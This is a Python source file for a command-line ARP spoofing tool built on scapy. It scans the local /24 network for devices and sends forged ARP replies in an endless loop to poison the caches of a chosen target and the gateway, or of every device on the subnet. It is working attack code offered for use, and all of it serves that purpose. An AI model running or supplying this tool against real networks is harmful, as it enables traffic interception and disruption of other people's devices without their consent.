import argparse
import socket
import sys
from colorama import *
try:
    from scapy.all import *
except ModuleNotFoundError:
    print(Fore.RED + 'ModuleNotFoundError - Scapy not installed, please run: pip install scapy' + Style.RESET_ALL)
    quit()

class scan(argparse.Action):
    def __init__(self, dest='time', option_strings=None, nargs='?', type=int, default=2, **kwargs):
        self.default = default
        super().__init__(dest='time', option_strings=option_strings, nargs='?', default=2, **kwargs)

    def get_lan_ip(self):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("google.com", 80))
        ip = s.getsockname()
        s.close()
        return ip[0]

    def gateway(self):
        ip_list = scan.get_lan_ip(scan).split('.')
        del ip_list[-1]
        ip_list.append('*')
        ip_range = '.'.join(ip_list)
        del ip_list[-1]
        ip_list.append('1')
        gateway = '.'.join(ip_list)
        return gateway

    def __call__(self, parser, namespace, values, option_string=None):
        time = int(values) if values else self.default
        ip_range = self.gateway() + '/24'

        arp_request = ARP(pdst = ip_range, psrc = self.get_lan_ip())
        broadcast = Ether(dst = "ff:ff:ff:ff:ff:ff")
        ARP_request_broadcast = broadcast/arp_request

        answered = srp(ARP_request_broadcast, timeout = time, verbose = True)[0]

        print(" \n IP\t\t\tMAC address\n" + 43 * '-')

        for element in answered:
            print(" " + element[1].psrc + "\t\t" + element[1].hwsrc)

class spoof(argparse.Action):
    def __init__(self, dest, option_strings=None, nargs=2, type=str, metavar=("[TARGET-IP]", "[TARGET-MAC]"), **kwargs):
        super().__init__(dest=dest, option_strings=option_strings, nargs=nargs, metavar=metavar, **kwargs)

    def get_gateway_mac(self):
        print('Getting gateway mac address...')
        arp_request2 = ARP(pdst = scan.gateway(scan), psrc = scan.get_lan_ip(scan))
        broadcast2 = Ether(dst = "ff:ff:ff:ff:ff:ff")
        ARP_request_broadcast = broadcast2/arp_request2

        answered = srp(ARP_request_broadcast, timeout = 2, verbose = False)[0]

        for element in answered:
            gatewayMAC = (element[1].hwsrc)
            print('Gateway is at ' + gatewayMAC)
            return gatewayMAC
        
    def __call__(self, parser, namespace, values, option_string = None):
        arp_request1 = ARP(pdst = values[0], psrc = scan.gateway(scan),hwsrc = (Ether().src), op = 2)
        broadcast1 = Ether(dst = values[1])
        ARP_request_broadcast1 = broadcast1/arp_request1

        arp_request2 = ARP(pdst = scan.gateway(scan), psrc = values[0],hwsrc = values[1] , op = 2)
        broadcast2 = Ether(dst =  self.get_gateway_mac())
        ARP_request_broadcast2 = broadcast2/arp_request2
        
        print("\nThe spoof has started....")
        sent_packets = 0
            
        while True:  
            try:
                sent_packets += 2
                print("\rSent packets: ", end = str(sent_packets))
                sys.stdout.flush()
                                
                sendp(ARP_request_broadcast1, verbose = False)
                sendp(ARP_request_broadcast2, verbose = False)
                
                time.sleep(2)
            except KeyboardInterrupt:
                print('\n\nKeyboardInterrupt detected, stoping the script...')
                try:
                    sys.exit(0)
                except SystemExit:
                    os._exit(0)

class spoof_all(argparse.Action):
    def __init__(self, dest, option_strings=None, nargs=0, **kwargs):
        super().__init__(dest=dest, option_strings=option_strings, nargs=nargs, **kwargs)

    def __call__(self, parser, namespace, values, option_string = None):
        ip_range = scan.gateway(scan) + '/24'

        arp_request = ARP(pdst = ip_range, psrc = scan.gateway(scan),hwsrc = (Ether().src), op = 2)
        broadcast = Ether(dst = "ff:ff:ff:ff:ff:ff")
        ARP_request_broadcast = broadcast/arp_request 

        arp_request2 = ARP(pdst = scan.gateway(scan), psrc = ip_range,hwsrc = (Ether().src), op = 2)
        broadcast2 = Ether(dst = spoof.get_gateway_mac(spoof))
        ARP_request_broadcast2 = broadcast2/arp_request2
        
        print("\nThe spoof has started....")
        sent_packets = 0

        while True:
            try:
                sent_packets += 2
                print("\rSent packets: ", end = str(sent_packets))
                sys.stdout.flush()

                sendp(ARP_request_broadcast, verbose = False)
                sendp(ARP_request_broadcast2, verbose = False)

                time.sleep(1)
            except KeyboardInterrupt:
                print('\n\nKeyboardInterrupt detected, stoping the script...')
                try:
                    sys.exit(0)
                except SystemExit:
                    os._exit(0)
        
if __name__ == '__main__':
     parser = argparse.ArgumentParser(description='ARP spoofer', epilog='Press CTRL + C to stop the script\nVersion: 0.7', formatter_class=argparse.RawDescriptionHelpFormatter)
     parser.add_argument('--scan', help='scan the network to see devices', action=scan)
     parser.add_argument('-s', '--spoof', help="spoof device's gateway", action=spoof)
     parser.add_argument('-sa', '--spoof-all', help="spoof all devices", action=spoof_all)
     args = parser.parse_args()
else:
    pass